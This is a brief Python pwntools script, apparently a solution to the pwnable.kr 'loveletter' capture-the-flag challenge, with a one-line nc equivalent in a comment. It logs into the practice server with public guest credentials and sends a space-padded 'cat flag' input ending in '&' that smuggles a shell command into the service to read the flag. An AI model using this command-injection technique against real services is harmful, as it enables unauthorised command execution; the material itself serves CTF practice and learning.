#!/usr/bin/python

#
# or just:
# ssh loveletter@pwnable.kr -p2222 (pw:guest)
# python -c "print 'cat flag '.ljust(253, ' ') + '&'" | nc 0 9034 
#

from pwn import *

s = ssh(host='pwnable.kr', port=2222, user='loveletter', password='guest')
t = s.remote('0', 9034)
t.sendline('cat flag '.ljust(253, ' ') + '&')

print t.recvall()
